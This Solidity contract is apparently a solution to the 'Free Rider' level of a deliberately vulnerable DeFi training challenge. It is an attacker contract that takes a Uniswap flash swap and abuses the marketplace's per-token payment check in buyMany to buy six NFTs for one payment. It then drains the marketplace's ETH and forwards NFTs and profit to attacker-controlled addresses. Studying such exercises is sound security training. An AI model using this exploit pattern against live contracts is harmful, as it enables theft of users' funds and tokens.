// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

import "hardhat/console.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace public marketplace;
    IUniswapV2Pair public pair;
    IWETH public weth;
    IERC721 public nft;

    address private attacker;
    address private recoveryContract;

    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];
    uint256 public constant NFT_PRICE = 15 ether;

    constructor(
        address payable _marketplace,
        address _pair,
        address _weth,
        address _nft,
        address _recoveryContract
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        pair = IUniswapV2Pair(_pair);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        attacker = msg.sender;
        recoveryContract = _recoveryContract;
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "Unauthorized");
        require(sender == address(this), "Unauthorized");

        console.log("Received %s WETH", amount0 > 0 ? amount0 : amount1);

        uint256 wethBalance = IERC20(address(weth)).balanceOf(address(this));
        console.log("WETH Balance: %s", wethBalance);

        weth.withdraw(wethBalance);

        console.log("Balance: %s", address(this).balance);

        (bool success, ) = address(this).call{value: NFT_PRICE}(data);
        require(success, "Call failed");

        // this.exploit{value: NFT_PRICE}();

        uint256 amountOut = amount0 > 0 ? amount0 : amount1;
        uint256 amountToPayBack = (amountOut * 1000) / 997 + 1;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);
    }

    function flashLoanETHFromUniswapV2(
        uint256 amount,
        bytes calldata data
    ) external {
        console.log("Flash loaning %s WETH", amount);
        require(data.length > 0, "Invalid data length");
        address token0 = pair.token0();
        address token1 = pair.token1();
        bool isToken0WETH = token0 == address(weth);
        bool isToken1WETH = token1 == address(weth);
        require(isToken0WETH || isToken1WETH, "Invalid pair");
        uint256 amount0 = isToken0WETH ? amount : 0;
        uint256 amount1 = isToken1WETH ? amount : 0;
        pair.swap(amount0, amount1, address(this), data);
    }

    function exploit() external payable {
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
        console.log("NFTs bought");
        console.log("Balance: %s", address(this).balance);

        nft.setApprovalForAll(address(marketplace), true);
        uint256 marketplaceBalance = address(marketplace).balance;

        uint256[] memory twoTokenIds = new uint256[](2);
        twoTokenIds[0] = 0;
        twoTokenIds[1] = 1;

        uint256[] memory prices = new uint256[](2);
        for (uint256 i; i < twoTokenIds.length; ) {
            prices[i] = marketplaceBalance;
            unchecked {
                ++i;
            }
        }
        marketplace.offerMany(twoTokenIds, prices);

        marketplace.buyMany{value: marketplaceBalance}(twoTokenIds);

        console.log("Recovery contract: %s", recoveryContract);
        bytes memory data = abi.encode(attacker);
        for (uint256 i; i < tokenIds.length; ) {
            require(nft.ownerOf(tokenIds[i]) == address(this), "Not owner");
            nft.safeTransferFrom(
                address(this),
                recoveryContract,
                tokenIds[i],
                data
            );
            unchecked {
                ++i;
            }
        }
    }

    function attack() public {
        require(attacker == msg.sender, "Unauthorized");
        bytes memory data = abi.encodeWithSelector(this.exploit.selector);
        this.flashLoanETHFromUniswapV2(NFT_PRICE, data);
        payable(attacker).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256 /* _tokenId */,
        bytes memory /* _data */
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
